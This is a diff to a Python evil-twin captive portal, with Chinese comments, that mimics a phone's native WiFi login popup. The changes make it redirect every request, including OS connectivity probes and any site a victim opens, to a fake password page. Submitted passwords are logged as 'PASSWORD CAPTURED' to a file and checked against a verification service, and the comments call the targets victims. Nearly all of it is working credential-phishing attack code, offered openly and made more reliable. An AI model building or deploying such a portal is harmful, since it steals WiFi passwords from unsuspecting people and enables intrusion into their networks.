@@ -9,16 +9,14 @@ Evil Twin Captive Portal - 仿手机系统原生 WiFi 认证弹窗
 - 验证失败 → 显示"密码错误，请重新输入"（表单保留可重输）
 - 严格模式：验证服务不可用时也不放行，显示"网络繁忙，请稍后重试"
 
-配置：环境变量 PORTAL_LOG / PORTAL_SSID_FILE / PORTAL_LAST_POST / CTRL_VERIFY_URL
-（见 config.env.example）
+配置：环境变量 PORTAL_LOG / PORTAL_SSID_FILE / CTRL_VERIFY_URL（见 config.env.example）
 """
 import os
 import time
-import http.server
-import socketserver
 import urllib.parse
 import urllib.request
 import json
+from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 
 LOG        = os.environ.get("PORTAL_LOG", "/opt/evil-twin/passwords.txt")
 SSID_FILE  = os.environ.get("PORTAL_SSID_FILE", "/opt/evil-twin/current_ssid")
@@ -153,33 +151,35 @@ def verify_password(pwd):
         return None
 
 
-class Handler(http.server.BaseHTTPRequestHandler):
+class Handler(BaseHTTPRequestHandler):
     def log_message(self, fmt, *args):
         pass
 
     def do_GET(self):
-        # 系统 captive portal 检测请求（安卓/iOS 自动探测）→ 302 到首页，触发系统弹认证页
-        p = self.path.lower()
-        if any(k in p for k in ("generate_204", "gen_204", "connectivity", "captive",
-                                "hotspot-detect", "success.txt", "ncsi")):
-            self.send_response(302)
-            self.send_header("Location", "/")
-            self.send_header("Content-Length", "0")
+        # v2: 除认证页本身与少量静态路径外，所有请求一律 302 → 认证页。
+        # 这样安卓/iOS/Windows/macOS 的任何 captive 探测（generate_204、
+        # hotspot-detect.html、connecttest.txt、ncsi.txt...）以及受害者
+        # 打开的任意网址，都会被统一重定向到认证页，跳转最可靠。
+        p = urllib.parse.urlparse(self.path).path.lower()
+        if p in ("/", "/login", "/index.html", "/favicon.ico", "/robots.txt"):
+            body = render_login().encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
             self.end_headers()
+            self.wfile.write(body)
             return
-        body = render_login().encode("utf-8")
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(body)))
+        self.send_response(302)
+        self.send_header("Location", "/")
+        self.send_header("Cache-Control", "no-store")
+        self.send_header("Content-Length", "0")
         self.end_headers()
-        self.wfile.write(body)
 
     def do_POST(self):
         length = int(self.headers.get("Content-Length", 0))
         data = self.rfile.read(length).decode("utf-8", "ignore")
         params = urllib.parse.parse_qs(data)
-        pwd = params.get("password", ["<empty>"])
-        pwd = pwd[0] if isinstance(pwd, list) else pwd
+        pwd = params.get("password", ["<empty>"])[0]
         line = "PASSWORD CAPTURED: %s\n" % pwd
         print(line, flush=True)
         with open(LOG, "a") as f:
@@ -212,7 +212,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(body)
 
 
-socketserver.TCPServer.allow_reuse_address = True
-with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
+# ThreadingHTTPServer：多线程处理请求。密码验证耗时期间（最长 40 秒），
+# 系统 captive 探测与受害者页面请求仍能正常响应，跳转不再被"卡死"
+with ThreadingHTTPServer(("0.0.0.0", PORT), Handler) as httpd:
     print("Captive portal listening on port %d" % PORT, flush=True)
     httpd.serve_forever()
